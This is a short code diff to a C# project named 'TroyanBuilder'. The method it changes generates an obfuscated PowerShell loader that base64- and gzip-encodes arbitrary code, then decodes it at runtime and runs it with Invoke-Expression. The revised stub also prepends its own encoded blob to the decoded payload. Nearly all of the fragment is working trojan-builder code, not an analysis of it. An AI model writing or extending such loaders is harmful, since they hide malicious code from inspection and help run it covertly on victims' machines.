@@ -58,25 +58,18 @@ namespace TroyanBuilder
         public static string GeneratePowerShellScript(string powerShellCode)
         {
             var encoded = Encode(powerShellCode);
-            return $@"
-$EncodedScript = ""{encoded}""
+            return $"""
+$EncodedScript = "{encoded}"
 
-function Decode-Script {{
-    param([string]$EncodedText)
-    $CompressedBytes = [Convert]::FromBase64String($EncodedText)
+    $CompressedBytes = [Convert]::FromBase64String($EncodedScript)
     $MemoryStream = New-Object System.IO.MemoryStream(, $CompressedBytes)
     $GzipStream = New-Object System.IO.Compression.GzipStream($MemoryStream, [System.IO.Compression.CompressionMode]::Decompress)
     $StreamReader = New-Object System.IO.StreamReader($GzipStream, [System.Text.Encoding]::UTF8)
-    $StreamReader.ReadToEnd()
-}}
-
-function Run-Script {{
-    $DecodedScript = Decode-Script -EncodedText $EncodedScript
+    $data = $StreamReader.ReadToEnd()
+    $DecodedScript = "`$EncodedScript = '$EncodedScript'" +  [Environment]::NewLine + $data
     Invoke-Expression $DecodedScript
-}}
 
-Run-Script
-";
+""";
         }
 
 
